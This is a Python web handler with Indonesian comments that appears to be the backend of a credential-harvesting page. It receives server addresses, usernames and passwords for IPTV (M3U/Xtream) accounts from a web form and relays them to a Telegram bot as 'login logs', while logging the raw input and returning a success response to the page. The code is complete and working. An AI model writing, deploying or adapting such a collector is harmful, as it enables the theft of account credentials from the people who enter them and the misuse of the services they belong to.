import os
import json
import urllib.request
from http.server import BaseHTTPRequestHandler
from datetime import datetime

def kirim_ke_telegram(pesan):
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    chat_id = os.environ.get('TELEGRAM_CHAT_ID')
    
    if not token or not chat_id:
        print("ERROR: Env var Telegram kosong!")
        return

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": pesan
    }
    
    try:
        req = urllib.request.Request(
            url,
            data=json.dumps(payload).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            print("Sukses kirim ke Telegram")
    except Exception as e:
        print(f"Gagal kirim ke Telegram: {e}")

class handler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length') or 0)
        
        # Baca body data mentah
        if content_length > 0:
            try:
                post_data = self.rfile.read(content_length).decode('utf-8')
                print(f"Data masuk: {post_data}")
            except Exception:
                post_data = ""
        else:
            post_data = ""

        # Proses data untuk pesan Telegram
        if post_data:
            try:
                data = json.loads(post_data)
                # Sinkronisasi total dengan index.html (server, username, password)
                server   = data.get('server') or data.get('host') or '-'
                username = data.get('username') or data.get('usr') or '-'
                password = data.get('password') or data.get('pwd') or '-'
                
                pesan = (
                    f"LOG M3U XTREAM MASUK\n\n"
                    f"Server  : {server}\n"
                    f"Username: {username}\n"
                    f"Password: {password}\n\n"
                    f"Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} WIB"
                )
            except Exception:
                # Jika format bukan JSON, kirimkan teks mentahnya
                pesan = f"LOG M3U RAW TEXT:\n\n{post_data}"
            
            # Eksekusi kirim
            kirim_ke_telegram(pesan)

        # Kirim balik response sukses ke frontend web Anda
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
